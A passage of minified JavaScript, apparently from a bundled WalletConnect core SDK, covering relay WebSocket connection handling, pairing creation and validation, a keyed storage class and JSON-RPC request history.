transport"),this.transportClose()}),Ge(this,"registerProviderListeners",()=>{this.provider.on(vn.payload,this.onPayloadHandler),this.provider.on(vn.connect,this.onConnectHandler),this.provider.on(vn.disconnect,this.onDisconnectHandler),this.provider.on(vn.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?_r(e.logger,this.name):Kf(Zg({level:e.logger||rB})),this.messages=new cU(this.logger,e.core),this.subscriber=new AU(this,this.logger),this.publisher=new pU(this,this.logger),this.relayUrl=(e==null?void 0:e.relayUrl)||jC,this.projectId=e.projectId,DO()?this.packageName=t3():BO()&&(this.bundleId=t3()),this.provider={}}async init(){if(this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.subscriber.hasAnyTopics)try{await this.transportOpen()}catch(e){this.logger.warn(e,e==null?void 0:e.message)}}get context(){return Jr(this.logger)}get connected(){var e,r,n;return((n=(r=(e=this.provider)==null?void 0:e.connection)==null?void 0:r.socket)==null?void 0:n.readyState)===1||!1}get connecting(){var e,r,n;return((n=(r=(e=this.provider)==null?void 0:e.connection)==null?void 0:r.socket)==null?void 0:n.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,r,n){this.isInitialized(),await this.publisher.publish(e,r,n),await this.recordMessageEvent({topic:e,message:r,publishedAt:Date.now(),transportType:mt.relay},R0.outbound)}async subscribe(e,r){var n,i,s;this.isInitialized(),(!(r!=null&&r.transportType)||(r==null?void 0:r.transportType)==="relay")&&await this.toEstablishConnection();const o=typeof((n=r==null?void 0:r.internal)==null?void 0:n.throwOnFailedPublish)>"u"?!0:(i=r==null?void 0:r.internal)==null?void 0:i.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const l=u=>{u.topic===e&&(this.subscriber.off(on.created,l),c())};return await Promise.all([new Promise(u=>{c=u,this.subscriber.on(on.created,l)}),new Promise(async(u,h)=>{a=await this.subscriber.subscribe(e,v5({internal:{throwOnFailedPublish:o}},r)).catch(d=>{o&&h(d)})||a,u()})]),a}async unsubscribe(e,r){this.isInitialized(),await this.subscriber.unsubscribe(e,r)}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await To(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(r,n)=>{await this.connect(e).then(r).catch(n).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await F3())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if((e==null?void 0:e.length)===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const r=e.sort((n,i)=>n.publishedAt-i.publishedAt);this.logger.debug(`Batch of ${r.length} message events sorted`);for(const n of r)try{await this.onMessageEvent(n)}catch(i){this.logger.warn(i,"Error while processing batch message event: "+(i==null?void 0:i.message))}this.logger.trace(`Batch of ${r.length} message events processed`)}async onLinkMessageEvent(e,r){const{topic:n}=e;if(!r.sessionExists){const i=Dt(X.FIVE_MINUTES),s={topic:n,expiry:i,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(n,s)}this.events.emit(Kt.message,e),await this.recordMessageEvent(e,R0.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let r=1;for(;r<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${r}...`),await this.createProvider(),await new Promise(async(n,i)=>{const s=()=>{i(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(vn.disconnect,s),await To(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{i(o)}).finally(()=>{this.provider.off(vn.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{a(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(vn.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(vn.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,n()})}catch(n){await this.subscriber.stop();const i=n;this.logger.warn({},i.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${r}`);break}await new Promise(n=>setTimeout(n,X.toMiliseconds(r*1))),r++}}startPingTimeout(){var e,r,n,i,s;if(Q0())try{(r=(e=this.provider)==null?void 0:e.connection)!=null&&r.socket&&((s=(i=(n=this.provider)==null?void 0:n.connection)==null?void 0:i.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o==null?void 0:o.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new jn(new VD(zO({sdkVersion:ly,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,r){const{topic:n,message:i}=e;await this.messages.set(n,i,r)}async shouldIgnoreMessageEvent(e){const{topic:r,message:n}=e;if(!n||n.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${n}`),!0;if(!await this.subscriber.isKnownTopic(r))return this.logger.warn(`Ignoring message for unknown topic ${r}`),!0;const i=this.messages.has(r,n);return i&&this.logger.warn(`Ignoring duplicate message: ${n}`),i}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),Qb(e)){if(!e.method.endsWith(iB))return;const r=e.params,{topic:n,message:i,publishedAt:s,attestation:o}=r.data,a={topic:n,message:i,publishedAt:s,transportType:mt.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(v5({type:"event",event:r.id},a)),this.events.emit(r.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else Yg(e)&&this.events.emit(Kt.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,R0.inbound),this.events.emit(Kt.message,e))}async acknowledgePayload(e){const r=Jg(e.id,!0);await this.provider.connection.send(r)}unregisterProviderListeners(){this.provider.off(vn.payload,this.onPayloadHandler),this.provider.off(vn.connect,this.onConnectHandler),this.provider.off(vn.disconnect,this.onDisconnectHandler),this.provider.off(vn.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await F3();tR(async r=>{e!==r&&(e=r,r?await this.transportOpen().catch(n=>this.logger.error(n,n==null?void 0:n.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(Kt.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e==null?void 0:e.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},X.toMiliseconds(sB)))))}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){if(await this.confirmOnlineStateOrThrow(),!this.connected){if(this.connectPromise){await this.connectPromise;return}await this.connect()}}};function PU(){}function E5(t){if(!t||typeof t!="object")return!1;const e=Object.getPrototypeOf(t);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(t)==="[object Object]":!1}function C5(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function A5(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const kU="[object RegExp]",OU="[object String]",_U="[object Number]",TU="[object Boolean]",x5="[object Arguments]",$U="[object Symbol]",RU="[object Date]",DU="[object Map]",BU="[object Set]",LU="[object Array]",UU="[object Function]",MU="[object ArrayBuffer]",pw="[object Object]",FU="[object Error]",zU="[object DataView]",jU="[object Uint8Array]",HU="[object Uint8ClampedArray]",qU="[object Uint16Array]",VU="[object Uint32Array]",WU="[object BigUint64Array]",GU="[object Int8Array]",KU="[object Int16Array]",ZU="[object Int32Array]",JU="[object BigInt64Array]",QU="[object Float32Array]",YU="[object Float64Array]";function XU(t,e){return t===e||Number.isNaN(t)&&Number.isNaN(e)}function eM(t,e,r){return cd(t,e,void 0,void 0,void 0,void 0,r)}function cd(t,e,r,n,i,s,o){const a=o(t,e,r,n,i,s);if(a!==void 0)return a;if(typeof t==typeof e)switch(typeof t){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return t===e;case"number":return t===e||Object.is(t,e);case"function":return t===e;case"object":return Ad(t,e,s,o)}return Ad(t,e,s,o)}function Ad(t,e,r,n){if(Object.is(t,e))return!0;let i=A5(t),s=A5(e);if(i===x5&&(i=pw),s===x5&&(s=pw),i!==s)return!1;switch(i){case OU:return t.toString()===e.toString();case _U:{const c=t.valueOf(),l=e.valueOf();return XU(c,l)}case TU:case RU:case $U:return Object.is(t.valueOf(),e.valueOf());case kU:return t.source===e.source&&t.flags===e.flags;case UU:return t===e}r=r??new Map;const o=r.get(t),a=r.get(e);if(o!=null&&a!=null)return o===e;r.set(t,e),r.set(e,t);try{switch(i){case DU:{if(t.size!==e.size)return!1;for(const[c,l]of t.entries())if(!e.has(c)||!cd(l,e.get(c),c,t,e,r,n))return!1;return!0}case BU:{if(t.size!==e.size)return!1;const c=Array.from(t.values()),l=Array.from(e.values());for(let u=0;u<c.length;u++){const h=c[u],d=l.findIndex(f=>cd(h,f,void 0,t,e,r,n));if(d===-1)return!1;l.splice(d,1)}return!0}case LU:case jU:case HU:case qU:case VU:case WU:case GU:case KU:case ZU:case JU:case QU:case YU:{if(typeof Buffer<"u"&&Buffer.isBuffer(t)!==Buffer.isBuffer(e)||t.length!==e.length)return!1;for(let c=0;c<t.length;c++)if(!cd(t[c],e[c],c,t,e,r,n))return!1;return!0}case MU:return t.byteLength!==e.byteLength?!1:Ad(new Uint8Array(t),new Uint8Array(e),r,n);case zU:return t.byteLength!==e.byteLength||t.byteOffset!==e.byteOffset?!1:Ad(new Uint8Array(t),new Uint8Array(e),r,n);case FU:return t.name===e.name&&t.message===e.message;case pw:{if(!(Ad(t.constructor,e.constructor,r,n)||E5(t)&&E5(e)))return!1;const c=[...Object.keys(t),...C5(t)],l=[...Object.keys(e),...C5(e)];if(c.length!==l.length)return!1;for(let u=0;u<c.length;u++){const h=c[u],d=t[h];if(!Object.hasOwn(e,h))return!1;const f=e[h];if(!cd(d,f,h,t,e,r,n))return!1}return!0}default:return!1}}finally{r.delete(t),r.delete(e)}}function tM(t,e){return eM(t,e,PU)}var rM=Object.defineProperty,I5=Object.getOwnPropertySymbols,nM=Object.prototype.hasOwnProperty,iM=Object.prototype.propertyIsEnumerable,wy=(t,e,r)=>e in t?rM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,S5=(t,e)=>{for(var r in e||(e={}))nM.call(e,r)&&wy(t,r,e[r]);if(I5)for(var r of I5(e))iM.call(e,r)&&wy(t,r,e[r]);return t},Rr=(t,e,r)=>wy(t,typeof e!="symbol"?e+"":e,r);let Uc=class extends fD{constructor(e,r,n,i=Ki,s=void 0){super(e,r,n,i),this.core=e,this.logger=r,this.name=n,Rr(this,"map",new Map),Rr(this,"version",oB),Rr(this,"cached",[]),Rr(this,"initialized",!1),Rr(this,"getKey"),Rr(this,"storagePrefix",Ki),Rr(this,"recentlyDeleted",[]),Rr(this,"recentlyDeletedLimit",200),Rr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!ir(o)?this.map.set(this.getKey(o),o):T$(o)?this.map.set(o.id,o):$$(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),Rr(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),Rr(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),Rr(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>tM(a[c],o[c]))):this.values)),Rr(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=S5(S5({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),Rr(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=_r(r,this.name),this.storagePrefix=i,this.getKey=s}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const r=this.map.get(e);if(!r){if(this.recentlyDeleted.includes(e)){const{message:i}=ee("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}const{message:n}=ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(n),new Error(n)}return r}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:r}=ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var sM=Object.defineProperty,oM=(t,e,r)=>e in t?sM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Fe=(t,e,r)=>oM(t,typeof e!="symbol"?e+"":e,r);let aM=class{constructor(e,r){this.core=e,this.logger=r,Fe(this,"name",uB),Fe(this,"version",hB),Fe(this,"events",new Tb),Fe(this,"pairings"),Fe(this,"initialized",!1),Fe(this,"storagePrefix",Ki),Fe(this,"ignoredPayloadTypes",[Ls]),Fe(this,"registeredMethods",[]),Fe(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),Fe(this,"register",({methods:n})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...n])]}),Fe(this,"create",async n=>{this.isInitialized();const i=oy(),s=await this.core.crypto.setSymKey(i),o=Dt(X.FIVE_MINUTES),a={protocol:zC},c={topic:s,expiry:o,relay:a,active:!1,methods:n==null?void 0:n.methods},l=R3({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:i,relay:a,expiryTimestamp:o,methods:n==null?void 0:n.methods});return this.events.emit(xa.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:n==null?void 0:n.transportType}),{topic:s,uri:l}}),Fe(this,"pair",async n=>{this.isInitialized();const i=this.core.eventClient.createEvent({properties:{topic:n==null?void 0:n.uri,trace:[Ni.pairing_started]}});this.isValidPair(n,i);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=$3(n.uri);i.props.properties.topic=s,i.addTrace(Ni.pairing_uri_validation_success),i.addTrace(Ni.pairing_uri_not_expired);let u;if(this.pairings.keys.includes(s)){if(u=this.pairings.get(s),i.addTrace(Ni.existing_pairing),u.active)throw i.setError(ds.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);i.addTrace(Ni.pairing_not_expired)}const h=c||Dt(X.FIVE_MINUTES),d={topic:s,relay:a,expiry:h,active:!1,methods:l};this.core.expirer.set(s,h),await this.pairings.set(s,d),i.addTrace(Ni.store_new_pairing),n.activatePairing&&await this.activate({topic:s}),this.events.emit(xa.create,d),i.addTrace(Ni.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),i.addTrace(Ni.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{i.setError(ds.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(f){throw i.setError(ds.subscribe_pairing_topic_failure),f}return i.addTrace(Ni.subscribe_pairing_topic_success),d}),Fe(this,"activate",async({topic:n})=>{this.isInitialized();const i=Dt(X.FIVE_MINUTES);this.core.expirer.set(n,i),await this.pairings.update(n,{active:!0,expiry:i})}),Fe(this,"ping",async n=>{this.isInitialized(),await this.isValidPing(n),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:i}=n;if(this.pairings.keys.includes(i)){const s=await this.sendRequest(i,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=ma();this.events.once(Xe("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}}),Fe(this,"updateExpiry",async({topic:n,expiry:i})=>{this.isInitialized(),await this.pairings.update(n,{expiry:i})}),Fe(this,"updateMetadata",async({topic:n,metadata:i})=>{this.isInitialized(),await this.pairings.update(n,{peerMetadata:i})}),Fe(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),Fe(this,"disconnect",async n=>{this.isInitialized(),await this.isValidDisconnect(n);const{topic:i}=n;this.pairings.keys.includes(i)&&(await this.sendRequest(i,"wc_pairingDelete",it("USER_DISCONNECTED")),await this.deletePairing(i))}),Fe(this,"formatUriFromPairing",n=>{this.isInitialized();const{topic:i,relay:s,expiry:o,methods:a}=n,c=this.core.crypto.keychain.get(i);return R3({protocol:this.core.protocol,version:this.core.version,topic:i,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),Fe(this,"sendRequest",async(n,i,s)=>{const o=$o(i,s),a=await this.core.crypto.encode(n,o),c=Sh[i].req;return this.core.history.set(n,o),this.core.relayer.publish(n,a,c),o.id}),Fe(this,"sendResult",async(n,i,s)=>{const o=Jg(n,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,n)).request.method,l=Sh[c].res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),Fe(this,"sendError",async(n,i,s)=>{const o=Qg(n,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,n)).request.method,l=Sh[c]?Sh[c].res:Sh.unregistered_method.res;await this.core.relayer.publish(i,a,l),await this.core.history.resolve(o)}),Fe(this,"deletePairing",async(n,i)=>{await this.core.relayer.unsubscribe(n),await Promise.all([this.pairings.delete(n,it("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(n),i?Promise.resolve():this.core.expirer.del(n)])}),Fe(this,"cleanup",async()=>{const n=this.pairings.getAll().filter(i=>co(i.expiry));await Promise.all(n.map(i=>this.deletePairing(i.topic)))}),Fe(this,"onRelayEventRequest",async n=>{const{topic:i,payload:s}=n;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(i,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(i,s);default:return await this.onUnknownRpcMethodRequest(i,s)}}),Fe(this,"onRelayEventResponse",async n=>{const{topic:i,payload:s}=n,o=(await this.core.history.get(i,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(i,s);default:return this.onUnknownRpcMethodResponse(o)}}),Fe(this,"onPairingPingRequest",async(n,i)=>{const{id:s}=i;try{this.isValidPing({topic:n}),await this.sendResult(s,n,!0),this.events.emit(xa.ping,{id:s,topic:n})}catch(o){await this.sendError(s,n,o),this.logger.error(o)}}),Fe(this,"onPairingPingResponse",(n,i)=>{const{id:s}=i;setTimeout(()=>{Oi(i)?this.events.emit(Xe("pairing_ping",s),{}):Mn(i)&&this.events.emit(Xe("pairing_ping",s),{error:i.error})},500)}),Fe(this,"onPairingDeleteRequest",async(n,i)=>{const{id:s}=i;try{this.isValidDisconnect({topic:n}),await this.deletePairing(n),this.events.emit(xa.delete,{id:s,topic:n})}catch(o){await this.sendError(s,n,o),this.logger.error(o)}}),Fe(this,"onUnknownRpcMethodRequest",async(n,i)=>{const{id:s,method:o}=i;try{if(this.registeredMethods.includes(o))return;const a=it("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,n,a),this.logger.error(a)}catch(a){await this.sendError(s,n,a),this.logger.error(a)}}),Fe(this,"onUnknownRpcMethodResponse",n=>{this.registeredMethods.includes(n)||this.logger.error(it("WC_METHOD_UNSUPPORTED",n))}),Fe(this,"isValidPair",(n,i)=>{var s;if(!Fr(n)){const{message:a}=ee("MISSING_OR_INVALID",`pair() params: ${n}`);throw i.setError(ds.malformed_pairing_uri),new Error(a)}if(!_$(n.uri)){const{message:a}=ee("MISSING_OR_INVALID",`pair() uri: ${n.uri}`);throw i.setError(ds.malformed_pairing_uri),new Error(a)}const o=$3(n==null?void 0:n.uri);if(!((s=o==null?void 0:o.relay)!=null&&s.protocol)){const{message:a}=ee("MISSING_OR_INVALID","pair() uri#relay-protocol");throw i.setError(ds.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=ee("MISSING_OR_INVALID","pair() uri#symKey");throw i.setError(ds.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&X.toMiliseconds(o==null?void 0:o.expiryTimestamp)<Date.now()){i.setError(ds.pairing_expired);const{message:a}=ee("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),Fe(this,"isValidPing",async n=>{if(!Fr(n)){const{message:s}=ee("MISSING_OR_INVALID",`ping() params: ${n}`);throw new Error(s)}const{topic:i}=n;await this.isValidPairingTopic(i)}),Fe(this,"isValidDisconnect",async n=>{if(!Fr(n)){const{message:s}=ee("MISSING_OR_INVALID",`disconnect() params: ${n}`);throw new Error(s)}const{topic:i}=n;await this.isValidPairingTopic(i)}),Fe(this,"isValidPairingTopic",async n=>{if(!Tt(n,!1)){const{message:i}=ee("MISSING_OR_INVALID",`pairing topic should be a string: ${n}`);throw new Error(i)}if(!this.pairings.keys.includes(n)){const{message:i}=ee("NO_MATCHING_KEY",`pairing topic doesn't exist: ${n}`);throw new Error(i)}if(co(this.pairings.get(n).expiry)){await this.deletePairing(n);const{message:i}=ee("EXPIRED",`pairing topic: ${n}`);throw new Error(i)}}),this.core=e,this.logger=_r(r,this.name),this.pairings=new Uc(this.core,this.logger,this.name,this.storagePrefix)}get context(){return Jr(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(Kt.message,async e=>{const{topic:r,message:n,transportType:i}=e;if(this.pairings.keys.includes(r)&&i!==mt.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(n)))try{const s=await this.core.crypto.decode(r,n);Qb(s)?(this.core.history.set(r,s),await this.onRelayEventRequest({topic:r,payload:s})):Yg(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:r,payload:s}),this.core.history.delete(r,s.id)),await this.core.relayer.messages.ack(r,n)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(Tn.expired,async e=>{const{topic:r}=ZE(e.target);r&&this.pairings.keys.includes(r)&&(await this.deletePairing(r,!0),this.events.emit(xa.expire,{topic:r}))})}};var cM=Object.defineProperty,lM=(t,e,r)=>e in t?cM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,tr=(t,e,r)=>lM(t,typeof e!="symbol"?e+"":e,r);let uM=class extends lD{constructor(e,r){super(e,r),this.core=e,this.logger=r,tr(this,"records",new Map),tr(this,"events",new mn.EventEmitter),tr(this,"name",dB),tr(this,"version",fB),tr(this,"cached",[]),tr(this,"initialized",!1),tr(this,"storagePrefix",Ki),tr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(n=>this.records.set(n.id,n)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),tr(this,"set",(n,i,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:n,request:i,chainId:s}),this.records.has(i.id))return;const o={id:i.id,topic:n,request:{method:i.method,params:i.params||null},chainId:s,expiry:Dt(X.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(Vn.created,o)}),tr(this,"resolve",async n=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:n}),!this.records.has(n.id))return;const i=await this.getRecord(n.id);typeof i.response>"u"&&(i.response=Mn(n)?{error:n.error}:{result:n.result},this.records.set(i.id,i),this.persist(),this.events.emit(Vn.updated,i))}),tr(this,"get",async(n,i)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:n,id:i}),await this.getRecord(i))),tr(this,"delete",(n,i)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:i}),this.values.forEach(s=>{if(s.topic===n){if(typeof i<"u"&&s.id!==i)return;this.records.delete(s.id),this.events.emit(Vn.deleted,s)}}),this.persist()}),tr(this,"exists",async(n,i)=>(this.isInitialized(),this.records.has(i)?(await this.getRecord(i)).topic===n:!1)),tr(this,"on",(n,i)=>{this.events.on(n,i)}),tr(this,"once",(n,i)=>{this.events.once(n,i)}),tr(this,"off",(n,i)=>{this.events.off(n,i)}),tr(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.logger=_r(r,this.name)}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(r=>{if(typeof r.response<"u")return;const n={topic:r.topic,request:$o(r.request.method,r.request.params,r.id),chainId:r.chainId};return e.push(n)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const r=this.records.get(e);if(!r){const{message:n}=ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(n)}return r}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(Vn.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:r}=ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(Vn.created,e=>{const r=Vn.created;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.events.on(Vn.updated,e=>{const r=Vn.updated;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.events.on(Vn.deleted,e=>{const r=Vn.deleted;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.core.heartbeat.on(dh.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(r=>{X.toMiliseconds(r.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${r.id}`),this.records.delete(r.id),this.events.emit(Vn.deleted,r,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var hM=Object.defineProperty,dM=(t,e,r)=>e in t?hM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,dr=(t,e,r)=>dM(t,typeof e!="symbol"?e+"":e,r);let fM=class extends gD{constructor(e,r){super(e,r),this.core=e,this.logger=r,dr(this,"expirations",new Map),dr(this,"events",new mn.EventEmitter),dr(this,"name",pB),dr(this,"version",gB),dr(this,"cached",[]),dr(this,"initialized",!1),dr(this,"storagePrefix",Ki),dr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await 